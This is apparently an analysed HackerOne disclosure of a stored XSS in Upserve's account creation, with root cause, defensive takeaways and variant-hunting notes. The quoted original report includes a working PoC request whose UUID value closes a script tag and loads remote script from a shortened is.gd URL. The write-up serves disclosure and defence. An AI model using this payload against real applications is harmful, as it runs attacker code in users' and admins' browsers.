# Stored XSS via User-Controlled UUID with URL-Shortened Payload

## Metadata
- **Source:** HackerOne
- **Report:** 249131 | https://hackerone.com/reports/249131
- **Submitted:** 2017-07-13
- **Reporter:** cache-money
- **Program:** Upserve
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Input Validation, Insufficient Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
The application allowed users to set arbitrary UUIDs during account creation without proper input validation, enabling injection of malicious scripts. By leveraging URL shortening to bypass character length restrictions, an attacker could inject script tags that execute in admin panels and other contexts where the UUID is displayed without sanitization.

## Attack scenario
1. Attacker crafts a malicious script payload and shortens it using a URL shortening service (e.g., is.gd) to fit within character length restrictions
2. Attacker intercepts or crafts a POST request to /c/user endpoint with the malicious UUID containing '</script><script src=//[shortened_url]>'
3. Application stores the UUID without proper validation or encoding in the database
4. When the UUID is displayed in HTML contexts (admin panels, user dashboards, reports), it is rendered without HTML encoding
5. The injected script tag closes the current script context and opens a new one pointing to attacker-controlled code
6. When any user (especially admins) views the page displaying this UUID, the malicious script executes in their browser with their privileges

## Root cause
The application implemented character length restrictions on the UUID field but failed to validate character content against a whitelist of allowed characters (alphanumeric, hyphens). Additionally, the UUID was rendered into JavaScript/HTML contexts without proper escaping or encoding, allowing script injection.

## Attacker mindset
The attacker recognized that UUID fields are often trusted and displayed in sensitive areas like admin panels without sanitization. By bypassing length restrictions through URL shortening and leveraging JavaScript's automatic closing tags, they created a compact payload that could execute arbitrary code when the UUID is viewed anywhere in the application.

## Defensive takeaways
- Implement strict whitelist validation for UUID fields accepting only valid UUID format (RFC 4122 compliant alphanumeric and hyphens)
- Apply context-aware output encoding: HTML entity encoding for HTML context, JavaScript string escaping for JavaScript context, URL encoding for URL context
- Never rely on character length restrictions as a security control; always validate format and content
- Sanitize and validate all user inputs server-side, not just on the client side
- Implement Content Security Policy (CSP) headers to restrict script execution sources
- Conduct security code review of all code paths where UUIDs or user-controlled fields are rendered
- Use templating engines with auto-escaping enabled by default

## Variant hunting
Other user-controlled identifier fields (usernames, account IDs, slugs) that might be rendered without encoding
Custom UUID generation endpoints that might accept different formats or special characters
API responses returning user data that could be injected into HTML/JavaScript contexts
Admin panel pages displaying user information where UUIDs appear in unencoded form
Database export or reporting features that might display UUIDs in downloadable formats without sanitization
Similar issues in related fields like 'brand_pretty_url' parameter shown in the PoC

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1566: Phishing
- T1204: User Execution
- T1539: Steal Web Session Cookie

## Notes
The attacker demonstrated sophistication by using URL shortening to bypass length restrictions and recognizing that closing script tags would be automatically handled by existing HTML structure. The comparison to report #246806 suggests a pattern of similar validation bypass vulnerabilities in the application. The live PoC shows the payload rendered directly in JSON within a JavaScript context, which is a high-risk location for XSS. The mention of 'admin panels and anywhere else a UUID is displayed' correctly identifies the broad blast radius of this vulnerability.

## Full report
<details><summary>Expand</summary>

I found an interesting bug where the system allows a user to create their own UUIDs. There are character length restrictions on this action, however it's not bound to a specific set of characters. Even so, I was able to include an external script that I URL shortened to just hit the character limit exactly. I was lucky I didn't need to add the closing script tag, because the one at the end of the line takes care of it. I wanted to get a full PoC rather than an `alert(1)`, because I think it could have been argued that the space was too small to actually do anything meaningful with.

This attack is similar in the way to #246806, except I'm quite confident this will be executed on admin panels and anywhere else a UUID is displayed, since sanitization on that attribute is highly unlikely.

**PoC**
Just replace the email with the one you own, and click the email confirmation link.
```
POST /c/user HTTP/1.1
Host: app.upserve.com
Accept: application/json
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://app.upserve.com/settings/account
Content-Length: 134
Content-Type: text/plain;charset=UTF-8
DNT: 1
Connection: close

uuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi
```

**Live PoC**
Visit the following page: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002

The generated HTML looks like:
`YUI.namespace('Env.DATA').consumer = {"uuid":"</script><script src=//is.gd/z0i2sU>","firstName":null,`

Thanks,
-- Tanner

</details>

---
*Analysed by Claude on 2026-05-24*
